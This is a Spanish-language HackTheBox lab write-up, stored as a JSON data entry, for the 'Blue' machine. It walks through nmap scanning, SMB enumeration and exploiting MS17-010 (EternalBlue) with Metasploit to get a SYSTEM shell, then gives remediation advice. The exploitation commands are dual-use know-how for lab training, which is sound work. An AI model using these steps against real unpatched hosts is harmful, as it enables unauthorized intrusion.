@@ -1,0 +1,25 @@
+{
+  "name": "Blue",
+  "ip": "10.10.10.40",
+  "os": "Windows",
+  "diff": "Easy",
+  "plat": "HackTheBox",
+  "date": "2026-09-20",
+  "desc": "Windows 7 sin parchear contra MS17-010 (EternalBlue): SMB vulnerable y SYSTEM directo.",
+  "tags": "#windows #smb #eternalblue #ms17-010 #metasploit",
+  "img": {
+    "avatar": "/assets/img/machines/blue.png",
+    "banner": "/assets/img/machines/blue-banner.png",
+    "proof": "https://labs.hackthebox.com/achievement/machine/2772097/51"
+  },
+  "sections": {
+    "resumen": "Blue es de esas máquinas que te suben la moral. Un Windows 7 al que nunca le pasaron el parche de MS17-010, así que todo el trabajo está en darse cuenta de que el SMB está vulnerable. A partir de ahí lanzas EternalBlue y ya entras como <b>SYSTEM</b>, sin escalada ni nada de por medio.",
+    "vulnerabilidad": "<br>MS17-010</br> (CVE-2017-0143), conocida como <br>EternalBlue</br>, es un fallo en el servicio <b>SMBv1</b> de Windows. Al convertir las listas de atributos extendidos de OS/2 al formato de NT se calcula mal el tamaño y se desborda un búfer en memoria del kernel. Como el código acaba ejecutándose en el kernel, se entra directamente como <b>NT AUTHORITY\\SYSTEM</b>. Es la misma vulnerabilidad que usó WannaCry en 2017.",
+    "reconocimiento": "Escaneo de puertos de siempre:\n\n```term\n$ nmap -p- -n -Pn -sS --max-retries 1 blue\n```\n\nQuitando el rango dinámico de RPC quedan tres puertos, todos de SMB: <bc>135</bc>, <bc>139</bc> y <bc>445</bc>. Ni web, ni FTP, ni SSH: toda la superficie es SMB.\n\n```term\n$ nmap -p135,139,445 -n -sCV --version-intensity 9 blue\nOS: Windows 7 Professional 7601 Service Pack 1\nComputer name: haris-PC\nsmb-security-mode: message_signing: disabled (dangerous)\n```",
+    "enumeracion": "Listo los recursos compartidos con sesión nula y compruebo la vulnerabilidad de SMB:\n\n```term\n$ smbclient -L //blue/ -N\nADMIN$   C$   IPC$   Share   Users\n$ nmap -p445 --script smb-vuln-* blue\nsmb-vuln-ms17-010: <br>VULNERABLE</br> (CVE-2017-0143)\n```",
+    "explotacion": "Tiro del módulo de Metasploit de EternalBlue:\n\n```term\n$ msfconsole -q\nmsf6 > use exploit/windows/smb/ms17_010_eternalblue\nmsf6 > set RHOSTS blue\nmsf6 > set LHOST tun0\nmsf6 > run\n<b>[+]</b> Overwrite complete... SYSTEM session obtained!\nmeterpreter > getuid\nServer username: <b>NT AUTHORITY\\SYSTEM</b>\n```\n\nEl exploit entra directamente como <b>SYSTEM</b>, así que no hay escalada de privilegios que hacer.",
+    "flags": "```term\n$ type C:\\Users\\haris\\Desktop\\user.txt\n$ type C:\\Users\\Administrator\\Desktop\\root.txt\n```",
+    "arreglo": "Todo parte de un sistema sin actualizar, así que el arreglo va por capas:\n\n- <b>Aplicar el parche MS17-010.</b> Microsoft lo publicó en marzo de 2017, incluso para versiones ya sin soporte como XP o Server 2003. Con el parche puesto, el desbordamiento deja de existir.\n- <b>Desactivar SMBv1.</b> Es la medida de fondo: es un protocolo obsoleto que no debería estar activo en ninguna red moderna. En Windows se quita con <bc>Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol</bc>.\n- <b>No exponer el puerto 445.</b> SMB no tiene por qué ser accesible desde fuera de la red interna; filtrarlo en el firewall reduce muchísimo la superficie de ataque.\n- <b>Activar la firma SMB.</b> El escaneo la marcaba como deshabilitada, y tenerla activa evita manipulaciones de las sesiones SMB.",
+    "conclusiones": "El SMBv1 a estas alturas no debería existir: es un servicio anticuado con muchas vulnerabilidades conocidas y aquí, encima, la vulnerabilidad nos ha dado root nada más ejecutarla.\n\nEs buena práctica, al ver el puerto 445 abierto, tirar directamente <bc>nmap --script smb-vuln-*</bc>, que resuelve casi todo el reconocimiento.\n\nEl parche existía un mes antes de la filtración y casi dos antes de WannaCry. El problema casi nunca es que no haya solución, sino que no se aplica."
+  }
+}
